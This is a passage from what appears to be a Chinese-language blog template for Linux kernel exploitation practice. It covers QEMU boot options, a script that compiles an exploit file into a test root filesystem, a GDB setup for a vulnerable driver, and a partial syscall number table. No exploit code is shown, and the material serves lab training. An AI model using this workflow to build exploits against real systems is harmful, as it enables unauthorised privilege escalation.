class="string">&quot;rdinit=/linuxrc console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line"> -enable-kvm \</span><br><span class="line"> -smp cores=1,threads=1 \</span><br><span class="line"> -m 128M \</span><br><span class="line"> -cpu kvm64,+smep \</span><br><span class="line"> -no-reboot -no-shutdown \</span><br><span class="line"> -s -S</span><br></pre></td></tr></table></figure></p><p>  相关参数的含义通过<code>man qemu-system</code>查看，如下所示</p><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">-m</td><td style="text-align:center">虚拟机的内存大小，后缀为’M’或’G’</td></tr><tr><td style="text-align:center">-kernel</td><td style="text-align:center">内核镜像</td></tr><tr><td style="text-align:center">-initrd</td><td style="text-align:center">文件系统镜像</td></tr><tr><td style="text-align:center">-monitor</td><td style="text-align:center">重定向Qemu控制台，可以查看虚拟机状态</td></tr><tr><td style="text-align:center">-serial mon:dev_string</td><td style="text-align:center">当监视器以这种方式多路复用到 <strong>stdio</strong> 时，<code>Ctrl+C</code> 将不再终止 QEMU，而是传递给来宾</td></tr><tr><td style="text-align:center">-append</td><td style="text-align:center">kernel的参数，<a href="https://docs.kernel.org/admin-guide/kernel-parameters.html">参考链接</a><br><strong>root</strong>:根文件系统对应的设备，有默认值 <br><strong>init</strong>:制定内核执行的第一条命令，有默认值 <br><strong>console</strong>:console对应的设备，一般用<strong>ttyS0</strong>，从而重定向到串口</td></tr><tr><td style="text-align:center">-enable-kvm</td><td style="text-align:center">开启KVM虚拟化</td></tr><tr><td style="text-align:center">-nographic</td><td style="text-align:center">关闭Qemu GUI。可以使用-monitor重定向Qemu控制台;-serial重定向guest串口信息; -display重定向guest的GUI</td></tr><tr><td style="text-align:center">-smp</td><td style="text-align:center">设置虚拟机cpu属性</td></tr><tr><td style="text-align:center">-cpu</td><td style="text-align:center">设置cpu模型信息</td></tr><tr><td style="text-align:center">-no-reboot</td><td style="text-align:center">当内核崩溃后，静止重启</td></tr><tr><td style="text-align:center">-no-shutdown</td><td style="text-align:center">当内核崩溃后，冻结在崩溃位置处</td></tr></tbody></table></div><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h3 id="qemu启动脚本"><a href="#qemu启动脚本" class="headerlink" title="qemu启动脚本"></a>qemu启动脚本</h3><p>则本地调试脚本如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">apt_search</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        apt list --installed | grep <span class="string">&quot;<span class="variable">$arg</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> [ ! <span class="string">&quot;$?&quot;</span> = <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">return</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根文件系统路径</span></span><br><span class="line">ROOT=$(<span class="built_in">pwd</span>)/rootfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件系统映像路径</span></span><br><span class="line">ROOTFS=$(<span class="built_in">pwd</span>)/rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内核镜像路径</span></span><br><span class="line">KERNEL=$(<span class="built_in">pwd</span>)/kernel</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp源代码路径</span></span><br><span class="line">EXP=$(<span class="built_in">pwd</span>)/exp.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装所需要的依赖包</span></span><br><span class="line">apt_search libkeyutils-dev musl-tools</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="string">&quot;$?&quot;</span> = <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">sudo</span> apt-get install -y libkeyutils-dev musl-tools</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态编译exp</span></span><br><span class="line">gcc -E -Werror -Wall -o $(<span class="built_in">pwd</span>)/rootfs/exp.i <span class="variable">$&#123;EXP&#125;</span> \</span><br><span class="line">    &amp;&amp; musl-gcc -Os -Werror -Wall -static -o $(<span class="built_in">pwd</span>)/rootfs/exp $(<span class="built_in">pwd</span>)/rootfs/exp.i -lpthread \</span><br><span class="line">    &amp;&amp; strip -s $(<span class="built_in">pwd</span>)/rootfs/exp \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf $(<span class="built_in">pwd</span>)/rootfs/exp.i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成文件系统映像</span></span><br><span class="line">(<span class="built_in">cd</span> <span class="variable">$&#123;ROOT&#125;</span>; find . | cpio -o --format=newc &gt; <span class="variable">$&#123;ROOTFS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -serial mon:stdio \</span><br><span class="line">    -kernel <span class="variable">$&#123;KERNEL&#125;</span>/arch/x86_64/boot/bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">    -initrd <span class="variable">$&#123;ROOTFS&#125;</span> \</span><br><span class="line">    -no-shutdown -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></p><h3 id="gdb配置文件"><a href="#gdb配置文件" class="headerlink" title="gdb配置文件"></a>gdb配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># .gdbinit</span><br><span class="line">target remote localhost:1234</span><br><span class="line"></span><br><span class="line"># 设置kernel基址</span><br><span class="line">set $kernel_base=0xffffffff81000000</span><br><span class="line">set $driver_base=0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">add-symbol-file kernel/vmlinux $kernel_base</span><br><span class="line">add-symbol-file driver/vuln.ko $driver_base</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>参考<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl">arch/x86/entry/syscalls/syscall_64.tbl</a>，使用如下命令<code>cat arch/x86/entry/syscalls/syscall_64.tbl | awk &#39;&#123;print $3,$2,$1&#125;&#39; | awk &#39;&#123;if(NF==3)&#123;print $0&#125;&#125;&#39; | awk &#39;&#123;if($2==&quot;common&quot; || $2==&quot;64&quot; || $2==&quot;x32&quot;)&#123;printf &quot;|%-30s|%-6s|%s|\n&quot;,$1,$2,$3&#125;&#125;&#39;</code>，生成64位下的系统调用号</p><div class="table-container"><table><thead><tr><th style="text-align:center">系统调用名称</th><th style="text-align:center">abi</th><th style="text-align:center">系统调用号</th></tr></thead><tbody><tr><td style="text-align:center">read</td><td style="text-align:center">common</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">write</td><td style="text-align:center">common</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">open</td><td style="text-align:center">common</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">close</td><td style="text-align:center">common</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">stat</td><td style="text-align:center">common</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">fstat</td><td style="text-align:center">common</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">lstat</td><td style="text-align:center">common</td><td style="text-align:center">6</td></tr><tr><td style="text-align:center">poll</td><td style="text-align:center">common</td><td style="text-align:center">7</td></tr><tr><td style="text-align:center">lseek</td><td style="text-align:center">common</td><td style="text-align:center">8</td></tr><tr><td style="text-align:center">mmap</td><td style="text-align:center">common</td><td style="text-align:center">9</td></tr><tr><td style="text-align:center">mprotect</td><td style="text-align:center">common</td><td style="text-align:center">10</td></tr><tr><td style="text-align:center">munmap</td><td style="text-align:center">common</td><td style="text-align:center">11</td></tr><tr><td style="text-align:center">brk</td><td style="text-align:center">common</td><td style="text-align:center">12</td></tr><tr><td style="text-align:center">rt_sigaction</td><td style="text-align:center">64</td><td style="text-align:center">13</td></tr><tr><td style="text-align:center">rt_sigprocmask</td><td style="text-align:center">common</td><td style="text-align:center">14</td></tr><tr><td style="text-align:center">rt_sigreturn</td><td style="text-align:center">64</td><td style="text-align:center">15</td></tr><tr><td style="text-align:center">ioctl</td><td style="text-align:center">64</td><td style="text-align:center">16</td></tr><tr><td style="text-align:center">pread64</td><td style="text-align:center">common</td><td style="text-align:center">17</td></tr><tr><td style="text-align:center">pwrite64</td><td style="text-align:center">common</td><td style="text-align:center">18</td></tr><tr><td style="text-align:center">readv</td><td style="text-align:center">64</td><td style="text-align:center">19</td></tr><tr><td style="text-align:center">writev</td><td style="text-align:center">64</td><td style="text-align:center">20</td></tr><tr><td style="text-align:center">access</td><td style="text-align:center">common</td><td style="text-align:center">21</td></tr><tr><td style="text-align:center">pipe</td><td style="text-align:center">common</td><td style="text-align:center">22</td></tr><tr><td style="text-align:center">select</td><td style="text-align:center">common</td><td style="text-align:center">23</td></tr><tr><td style="text-align:center">sched_yield</td><td style="text-align:center">common</td><td style="text-align:center">24</td></tr><tr><td style="text-align:center">mremap</td><td style="text-align:center">common</td><td style="text-align:center">25</td></tr><tr><td style="text-align:center">msync</td><td style="text-align:center">common</td><td style="text-align:center">26</td></tr><tr><td style="text-align:center">mincore</td><td style="text-align:center">common</td><td style="text-align:center">27</td></tr><tr><td style="text-align:center">madvise</td><td style="text-align:center">common</td><td style="text-align:center">28</td></tr><tr><td style="text-align:center">shmget</td><td style="text-align:center">common</td><td style="text-align:center">29</td></tr><tr><td style="text-align:center">shmat</td><td style="text-align:center">common</td><td style="text-align:center">30</td></tr><tr><td style="text-align:center">shmctl</td><td style="text-align:center">common</td><td style="text-align:center">31</td></tr><tr><td style="text-align:center">dup</td><td style="text-align:center">common</td><td style="text-align:center">32</td></tr><tr><td style="text-align:center">dup2</td><td style="text-align:center">common</td><td style="text-align:center">33</td></tr><tr><td style="text-align:center">pause</td><td style="text-align:center">common</td><td style="text-align:center">34</td></tr><tr><td style="text-align:center">nanosleep</td><td style="text-align:center">common</td><td style="text-align:center">35</td></tr><tr><td style="text-align:center">getitimer</td><td style="text-align:center">common</td><td style="text-align:center">36</td></tr><tr><td style="text-align:center">alarm</td><td style="text-align:center">common</td><td style="text-align:center">37</td></tr><tr><td style="text-align:center">setitimer</td><td style="text-align:center">common</td><td style="text-align:center">38</td></tr><tr><td style="text-align:center">getpid</td><td style="text-align:center">common</td><td style="text-align:center">39</td></tr><tr><td style="text-align:center">sendfile</td><td style="text-align:center">common</td><td style="text-align:center">40</td></tr><tr><td style="text-align:center">socket</td><td style="text-align:center">common</td><td style="text-align:center">41</td></tr><tr><td style="text-align:center">connect</td><td style="text-align:center">common</td><td style="text-align:center">42</td></tr><tr><td style="text-align:center">accept</td><td style="text-align:center">common</td><td style="text-align:center">43</td></tr><tr><td style="text-align:center">sendto</td><td style="text-align:center">common</td><td style="text-align:center">44</td></tr><tr><td style="text-align:center">recvfrom</td><td style="text-align:center">64</td><td style="text-align:center">45</td></tr><tr><td style="text-align:center">sendmsg</td><td style="text-align:center">64</td><td style="text-align:center">46</td></tr><tr><td style="text-align:center">recvmsg</td><td style="text-align:center">64</td><td style="text-align:center">47</td></tr><tr><td style="text-align:center">shutdown</td><td style="text-align:center">common</td><td style="text-align:center">48</td></tr><tr><td style="text-align:center">bind</td><td style="text-align:center">common</td><td style="text-align:center">49</td></tr><tr><td style="text-align:center">listen</td><td style="text-align:center">common</td><td style="text-align:center">50</td></tr><tr><td style="text-align:center">getsockname</td><td style="text-align:center">common</td><td style="text-align:center">51</td></tr><tr><td style="text-align:center">getpeername</td><td style="text-align:center">common</td><td style="text-align:center">52</td></tr><tr><td style="text-align:center">socketpair</td><td style="text-align:center">common</td><td style="text-align:center">53</td></tr><tr><td style="text-align:center">setsockopt</td><td style="text-align:center">64</td><td style="text-align:center">54</td></tr><tr><td style="text-align:center">getsockopt</td><td style="text-align:center">64</td><td style="text-align:center">55</td></tr><tr><td style="text-align:center">clone</td><td style="text-align:center">common</td><td style="text-align:center">56</td></tr><tr><td style="text-align:center">fork</td><td style="text-align:center">common</td><td style="text-align:center">57</td></tr><tr><td style="text-align:center">vfork</td><td style="text-align:center">common</td><td style="text-align:center">58</td></tr><tr><td style="text-align:center">execve</td><td style="text-align:center">64</td><td style="text-align:center">59</td></tr><tr><td style="text-align:center">exit</td><td style="text-align:center">common</td><td style="text-align:center">60</td></tr><tr><td style="text-align:center">wait4</td><td style="text-align:center">common</td><td style="text-align:center">61</td></tr><tr><td style="text-align:center">kill</td><td style="text-align:center">common</td><td style="text-align:center">62</td></tr><tr><td style="text-align:center">uname</td><td style="text-align:center">common</td><td style="text-align:center">63</td></tr><tr><td style="text-align:center">semget</td><td style="text-align:center">common</td><td style="text-align:center">64</td></tr><tr><td style="text-align:center">semop</td><td style="text-align:center">common</td><td style="text-align:center">65</td></tr><tr><td style="text-align:center">semctl</td><td style="text-align:center">common</td><td style="text-align:center">66</td></tr><tr><td style="text-align:center">shmdt</td><td style="text-align:center">common</td><td style="text-align:center">67</td></tr><tr><td style="text-align:center">msgget</td><td style="text-align:center">common</td><td style="text-align:center">68</td></tr><tr><td style="text-align:center">msgsnd</td><td style="text-align:center">common</td><td style="text-align:center">69</td></tr><tr><td style="text-align:center">msgrcv</td><td style="text-align:center">common</td><td style="text-align:center">70</td></tr><tr><td style="text-align:center">msgctl</td><td style="text-align:center">common</td><td style="text-align:center">71</td></tr><tr><td style="text-align:center">fcntl</td><td style="text-align:center">common</td><td style="text-align:center">72</td></tr><tr><td style="text-align:center">flock</td><td style="text-align:center">common</td><td style="text-align:center">73</td></tr><tr><td style="text-align:center">fsync</td><td style="text-align:center">common</td><td style="text-align:center">74</td></tr><tr><td style="text-align:center">fdatasync</td><td style="text-align:center">common</td><td style="text-align:center">75</td></tr><tr><td style="text-align:center">truncate</td><td style="text-align:center">common</td><td style="text-align:center">76</td></tr><tr><td style="text-align:center">ftruncate</td><td style="text-align:center">common</td><td style="text-align:center">77</td></tr><tr><td style="text-align:center">getdents</td><td style="text-align:center">common</td><td style="text-align:center">78</td></tr><tr><td style="text-align:center">getcwd</td><td style="text-align:center">common</td><td style="text-align:center">79</td></tr><tr><td style="text-align:center">chdir</td><td style="text-align:center">common</td><td style="text-align:center">80</td></tr><tr><td style="text-align:center">fchdir</td><td style="text-align:center">common</td><td style="text-align:center">81</td></tr><tr><td style="text-align:center">rename</td><td style="text-align:center">common</td><td style="text-align:center">82</td></tr><tr><td style="text-align:center">mkdir</td><td style="text-align:center">common</td><td style="text-align:center">83</td></tr><tr><td style="text-align:center">rmdir</td><td style="text-align:center">common</td><td style="text-align:center">84</td></tr><tr><td style="text-align:center">creat</td><td style="text-align:center">common</td><td style="text-align:center">85</td></tr><tr><td style="text-align:center">link</td><td style="text-align:center">common</td><td style="text-align:center">86</td></tr><tr><td style="text-align:center">unlink</td><td style="text-align:center">common</td><td style="text-align:center">87</td></tr><tr><td style="text-align:center">symlink</td><td style="text-align:center">common</td><td style="text-align:center">88</td></tr><tr><td style="text-align:center">readlink</td><td style="text-align:center">common</td><td style="text-align:center">89</td></tr><tr><td style="text-align:center">chmod</td><td style="text-align:center">common</td><td style="text-align:center">90</td></tr><tr><td style="text-align:center">fchmod</td><td style="text-align:center">common</td><td style="text-align:center">91</td></tr><tr><td style="text-align:center">chown</td><td style="text-align:center">common</td><td style="text-align:center">92</td></tr><tr><td style="text-align:center">fchown</td><td style="text-align:center">common</td><td style="text-align:center">93</td></tr><tr><td style="text-align:center">lchown</td><td style="text-align:center">common</td><td style="text-align:center">94</td></tr><tr><td style="text-align:center">umask</td><td style="text-align:center">common</td><td style="text-align:center">95</td></tr><tr><td style="text-align:center">gettimeofday</td><td style="text-align:center">common</td><td style="text-align:center">96</td></tr><tr><td style="text-align:center">getrlimit</td><td style="text-align:center">common</td><td style="text-align:center">97</td></tr><tr><td style="text-align:center">getrusage</td><td style="text-align:center">common</td><td style="text-align:center">98</td></tr><tr><td style="text-align:center">sysinfo</td><td style="text-align:center">common</td><td style="text-align:center">99</td></tr><tr><td style="text-align:center">times</td><td style="text-align:center">common</td><td style="text-align:center">100</td></tr><tr><td style="text-align:center">ptrace</td><td style="text-align:center">64</td><td style="text-align:center">101</td></tr><tr><td style="text-align:center">getuid</td><td style="text-align:center">common</td><td style="text-align:center">102</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">common</td><td style="text-align:center">103</td></tr><tr><td style="text-align:center">getgid</td><td style="text-align:center">common</td><td style="text-align:center">104</td></tr><tr><td style="text-align:center">setuid</td><td style="text-align:center">common</td><td style="text-align:center">105</td></tr><tr><td style="text-align:center">setgid</td><td style="text-align:center">common</td><td style="text-align:center">106</td></tr><tr><td style="text-align:center">geteuid</td><td style="text-align:center">common</td><td style="text-align:center">107</td></tr><tr><td style="text-align:center">getegid</td><td style="text-align:center">common</td><td style="text-align:center">108</td></tr><tr><td style="text-align:center">setpgid</td><td style="text-align:center">common</td><td style="text-align:center">109</td></tr><tr><td style="text-align:center">getppid</td><td style="text-align:center">common</td><td style="text-align:center">110</td></tr><tr><td style="text-align:center">getpgrp</td><td style="text-align:center">common</td><td style="text-align:center">111</td></tr><tr><td style="text-align:center">setsid</td><td style="text-align:center">common</td><td style="text-align:center">112</td></tr><tr><td style="text-align:center">setreuid</td><td style="text-align:center">common</td><td style="text-align:center">113</td></tr><tr><td style="text-align:center">setregid</td><td style="text-align:center">common</td><td style="text-align:center">114</td></tr><tr><td style="text-align:center">getgroups</td><td style="text-align:center">common</td><td style="text-align:center">115</td></tr><tr><td style="text-align:center">setgroups</td><td style="text-align:center">common</td><td style="text-align:center">116</td></tr><tr><td style="text-align:center">setresuid</td><td style="text-align:center">common</td><td style="text-align:center">117</td></tr><tr><td style="text-align:center">getresuid</td><td style="text-align:center">common</td><td style="text-align:center">118</td></tr><tr><td style="text-align:center">setresgid</td><td style="text-align:center">common</td><td style="text-align:center">119</td></tr><tr><td style="text-align:center">getresgid</td><td style="text-align:center">common</td><td style="text-align:center">120</td></tr><tr><td style="text-align:center">getpgid</td><td style="text-align:center">common</td><td style="text-align:center">121</td></tr><tr><td style="text-align:center">setfsuid</td><td style="text-align:center">common</td><td style="text-align:center">122</td></tr><tr><td style="text-align:center">setfsgid</td><td style="text-align:center">common</td><td style="text-align:center">123</td></tr><tr><td style="text-align:center">getsid</td><td style="text-align:center">common</td><td style="text-align:center">124</td></tr><tr><td style="text-align:center">capget</td><td style="text-align:center">common</td><td style="text-align:center">125</td></tr><tr><td style="text-align:center">capset</td><td style="text-align:center">common</td><td style="text-align:center">126</td></tr><tr><td style="text-align:center">rt_sigpending</td><td style="text-align:center">64</td><td style="text-align:center">127</td></tr><tr><td style="text-align:center">rt_sigtimedwait</td><td style="text-align:center">64</td><td style="text-align:center">128</td></tr><tr><td style="text-align:center">rt_sigqueueinfo</td><td style="text-align:center">64</td><td style="text-align:center">129</td></tr><tr><td style="text-align:center">rt_sigsuspend</td><td style="text-align:center">common</td><td style="text-align:center">130</td></tr><tr><td style="text-align:center">sigaltstack</td><td style="text-align:center">64</td><td style="text-align:center">131</td></tr><tr><td style="text-align:center">utime</td><td style="text-align:center">common</td><td style="text-align:center">132</td></tr><tr><td style="text-align:center">mknod</td><td style="text-align:center">common</td><td style="text-align:center">133</td></tr><tr><td style="text-align:center">uselib</td><td style="text-align:center">64</td><td style="text-align:center">134</td></tr><tr><td style="text-align:center">personality</td><td style="text-align:center">common</td><td style="text-align:center">135</td></tr><tr><td style="text-align:center">ustat</td><td style="text-align:center">common</td><td style="text-align:center">136</td></tr><tr><td style="text-align:center">statfs</td><td style="text-align:center">common</td><td style="text-align:center">137</td></tr><tr><td style="text-align:center">fstatfs</td><td style="text-align:center">common</td><td style="text-align:center">138</td></tr><tr><td style="text-align:center">sysfs</td><td style="text-align:center">common</td><td style="text-align:center">139</td></tr><tr><td style="text-align:center">getpriority</td><td style="text-align:center">common</td><td style="text-align:center">140</td></tr><tr><td style="text-align:center">setpriority</td><td style="text-align:center">common</td><td style="text-align:center">141</td></tr><tr><td style="text-align:center">sched_setparam</td><td style="text-align:center">common</td><td style="text-align:center">142</td></tr><tr><td style="text-align:center">sched_getparam</td><td style="text-align:center">common</td><td style="text-align:center">143</td></tr><tr><td style="text-align:center">sched_setscheduler</td><td style="text-align:center">common</td><td style="text-align:center">144</td></tr><tr><td style="text-align:center">sched_getscheduler</td><td style="text-align:center">common</td><td style="text-align:center">145</td></tr><tr><td style="text-align:center">sched_get_priority_max</td><td style="text-align:center">common</td><td style="text-align:center">146</td></tr><tr><td style="text-align:center">sched_get_priority_min</td><td style="text-align:center">common</td><td style="text-align:center">147</td></tr><tr><td style="text-align:center">sched_rr_get_interval</td><td style="text-align:center">common</td><td style="text-align:center">148</td></tr><tr><td style="text-align:center">mlock</td><td style="text-align:center">common</td><td style="text-align:center">149</td></tr><tr><td style="text-align:center">munlock</td><td style="text-align:center">common</td><td style="text-align:center">150</td></tr><tr><td style="text-align:center">mlockall</td><td style="text-align:center">common</td><td style="text-align:center">151</td></tr><tr><td style="text-align:center">munlockall</td><td style="text-align:center">common</td><td style="text-align:center">152</td></tr><tr><td style="text-align:center">vhangup</td><td style="text-align:center">common</td><td style="text-align:center">153</td></tr><tr><td style="text-align:center">modify_ldt</td><td style="text-align:center">common</td><td style="text-align:center">154</td></tr><tr><td style="text-align:center">pivot_root</td><td style="text-align:center">common</td><td style="text-align:center">155</td></tr><tr><td style="text-align:center">_sysctl</td><td style="text-align:center">64</td><td style="text-align:center">156</td></tr><tr><td style="text-align:center">prctl</td><td style="text-align:center">common</td><td style="text-align:center">157</td></tr><tr><td style="text-align:center">arch_prctl</td><td style="text-align:center">common</td><td style="text-align:center">158</td></tr><tr><td style="text-align:center">adjtimex</td><td style="text-align:center">common</td><td style="text-align:center">159</td></tr><tr><td style="text-align:center">setrlimit</td><td style="text-align:center">common</td><td style="text-align:center">160</td></tr><tr><td style="text-align:center">chroot</td><td style="text-align:center">common</td><td style="text-align:center">161</td></tr><tr><td style="text-align:center">sync</td><td style="text-align:center">common</td><td style="text-align:center">162</td></tr><tr><td style="text-align:center">acct</td><td style="text-align:center">common</td><td style="text-align:center">163</td></tr><tr><td style="text-align:center">settimeofday</td><td style="text-align:center">common</td><td style="text-align:center">164</td></tr><tr><td style="text-align:center">mount</td><td style="text-align:center">common</td><td style="text-align:center">165</td></tr><tr><td style="text-align:center">umount2</td><td style="text-align:center">common</td><td style="text-align:center">166</td></tr><tr><td style="text-align:center">swapon</td><td style="text-align:center">common</td><td style="text-align:center">167</td></tr><tr><td style="text-align:center">swapoff</td><td style="text-align:center">common</td><td style="text-align:center">168</td></tr><tr><td style="text-align:center">reboot</td><td style="text-align:center">common</td><td style="text-align:center">169</td></tr><tr><td style="text-align:center">sethostname</td><td style="text-align:center">common</td><td style="text-align:center">170</td></tr><tr><td style="text-align:center">setdomainname</td><td style="text-align:center">common</td><td style="text-align:center">171</td></tr><tr><td style="text-align:center">iopl</td><td style="text-align:center">common</td><td style="text-align:center">172</td></tr><tr><td style="text-align:center">ioperm</td><td style="text-align:center">common</td><td style="text-align:center">173</td></tr><tr><td style="text-align:center">create_module</td><td style="text-align:center">64</td><td style="text-align:center">174</td></tr><tr><td style="text-align:center">init_module</td><td style="text-align:center">common</td><td style="text-align:center">175</td></tr><tr><td style="text-align:center">delete_module</td><td style="text-align:center">common</td><td style="text-align:center">176</td></tr><tr><td style="text-align:center">get_kernel_syms</td><td style="text-align:center">64</td><td style="text-align:center">177</td></tr><tr><td style="text-align:center">query_module</td><td style="text-align:center">64</td><td style="text-align:center">178</td></tr><tr><td style="text-align:center">quotactl</td><td style="text-align:center">common</td><td style="text-align:center">179</td></tr><tr><td style="text-align:center">nfsservctl</td><td style="text-align:center">64</td><td style="text-align:center">180</td></tr><tr><td style="text-align:center">getpmsg</td><td style="text-align:center">common</td><td style="text-align:center">181</td></tr><tr><td style="text-align:center">putpmsg</td><td style="text-align:center">common</td><td style="text-align:center">182</td></tr><tr><td style="text-align:center">afs_syscall</td><td style="text-align:center">common</td><td style="text-align:center">183</td></tr><tr><td style="text-align:center">tuxcall</td><td style="text-align:center">common</td><td style="text-align:center">184</td></tr><tr><td style="text-align:center">security</td><td style="text-align:center">common</td><td style="text-align:center">185</td></tr><tr><td style="text-align:center">gettid</td><td style="text-align:center">common</td><td style="text-align:center">186</td></tr><tr><td style="text-align:center">readahead</td><td style="text-align:center">common</td><td style="text-align:center">187</td></tr><tr><td style="text-align:center">setxattr</td><td style="text-align:center">common</td><td style="text-align:center">188</td></tr><tr><td style="text-align:center">lsetxattr</td><td style="text-align:center">common</td><td style="text-align:center">189</td></tr><tr><td style="text-align:center">fsetxattr</td><td style="text-align:center">common</td><td style="text-align:center">190</td></tr><tr><td style="text-align:center">getxattr</td><td style="text-align:center">common</td><td style="text-align:center">191</td></tr><tr><td style="text-align:center">lgetxattr</td><td style="text-align:center">common</td><td style="text-align:center">192</td></tr><tr><td style="text-align:center">fgetxattr</td><td style="text-align:center">common</td><td style="text-align:center">193</td></tr><tr><td style="text-align:center">listxattr</td><td style="text-align:center">common</td><td style="text-align:center">194</td></tr><tr><td style="text-align:center">llistxattr</td><td style="text-align:center">common</td><td style="text-align:center">195</td></tr><tr><td style="text-align:center">flistxattr</td><td style="text-align:center">common</td><td style="text-align:center">196</td></tr><tr><td style="text-align:center">removexattr</td><td style="text-align:center">common</td><td style="text-align:center">197</td></tr><tr><td style="text-align:center">lremovexattr</td><td style="text-align:center">common</td><td style="text-align:center">198</td></tr><tr><td style="text-align:center">fremovexattr</td><td style="text-align:center">common</td><td style="text-align:center">199</td></tr><tr><td style="text-align:center">tkill</td><td style="text-align:center">common</td><td style="text-align:center">200</td></tr><tr><td style="text-align:center">time</td><td style="text-align:center">common</td><td style="text-align:center">201</td></tr><tr><td style="text-align:center">futex</td><td style="text-align:center">common</td><td style="text-align:center">202</td></tr><tr><td style="text-align:center">sched_setaffinity</td><td style="text-align:center">common</td><td style="text-align:center">203</td></tr><tr><td style="text-align:center">sched_getaffinity</td><td style="text-align:center">common</td><td style="text-align:center">204</td></tr><tr><td style="text-align:center">set_thread_area</td><td style="text-align:center">64</td><td style="text-align:center">205</td></tr><tr><td style="text-align:center">io_setup</td><td style="text-align:center">64</td><td style="text-align:center">206</td></tr><tr><td style="text-align:center">io_destroy</td><td style="text-align:center">common</td><td style="text-align:center">207</td></tr><tr><td style="text-align:center">io_getevents</td><td style="text-align:center">common</td><td style="text-align:center">208</td></tr><tr><td style="text-align:center">io_submit</td><td style="text-align:center">64</td><td style="text-align:center">209</td></tr><tr><td style="text-align:center">io_cancel</td><td style="text-align:center">common</td><td style="text-align:center">210</td></tr><tr><td style="text-align:center">get_thread_area</td><td style="text-align:center">64</td><td style="text-align:center">211</td></tr><tr><td style="text-align:center">lookup_dcookie</td><td style="text-align:center">common</td><td style="text-align:center">212</td></tr><tr><td style="text-align:center">epoll_create</td><td style="text-align:center">common</td><td style="text-align:center">213</td></tr><tr><td style="text-align:center">epoll_ctl_old</td><td style="text-align:center">64</td><td style="text-align:center">214</td></tr><tr><td style="text-align:center">epoll_wait_old</td><td style="text-align:center">64</td><td style="text-align:center">215</td></tr><tr><td style="text-align:center">remap_file_pages</td><td style="text-align:center">common</td><td style="text-align:center">216</td></tr><tr><td style="text-align:center">getdents64</td><td style="text-align:center">common</td><td style="text-align:center">217</td></tr><tr><td style="text-align:center">set_tid_address</td><td style="text-align:center">common</td><td style="text-align:center">218</td></tr><tr><td style="text-align:center">restart_syscall</td><td 